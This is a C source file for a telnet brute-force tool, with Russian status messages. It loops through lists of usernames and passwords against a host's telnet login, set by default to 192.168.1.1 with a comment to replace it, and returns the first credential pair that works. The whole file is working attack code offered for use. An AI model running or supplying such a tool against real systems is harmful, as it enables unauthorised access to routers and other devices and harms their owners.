#include "include/includes.h"
#include "bruteforce_functions/telnet_passwords.c"
#include "bruteforce_functions/wait_for_prompt.c"
#include "bruteforce_functions/socket_things.c"
#include "bruteforce_functions/login_things.c"

char* telnet_login(const char *host) {
    static char result[256];
    char buffer[TELNET_MAX_BUFFER];
    int sock;
    struct sockaddr_in server;

    printf("Пытаемся войти на %s...\n", host);

    sock = create_socket(host, &server);
    if (sock < 0) return "";

    printf("Соединение установлено\n");

    for (const char **username = usernames; *username != NULL; username++) {
        if (!wait_for_prompt(sock)) return close_socket(sock, "");

        printf("Пытаемся войти с %s\n", *username);

        sleep(3);
        send_username(sock, *username);

        printf("Подождали. Пытаемся войти с паролем\n");

        for (const char **password = passwords; *password != NULL; password++) {
            if (!wait_for_prompt(sock)) return close_socket(sock, "");

            printf("Пытаемся войти с паролем %s\n", *password);

            sleep(2);
            send_password(sock, *password);

            printf("Подождали. Пытаемся войти\n");

            sleep(5);
            if (check_login_success(sock, buffer)) {
                snprintf(result, sizeof(result), "%s:%s", *username, *password);
                close_socket(sock, "");
                return result;
            }
        }
    }

    close_socket(sock, "");
    return "";
}
int main() {
    const char *host = "192.168.1.1"; // Замените на нужный хост
    char *credentials = telnet_login(host);
    
    if (strlen(credentials) > 0) {
        printf("Успешный вход: %s\n", credentials);
    } else {
        printf("Не удалось войти на %s\n", host);
    }

    return 0;
}
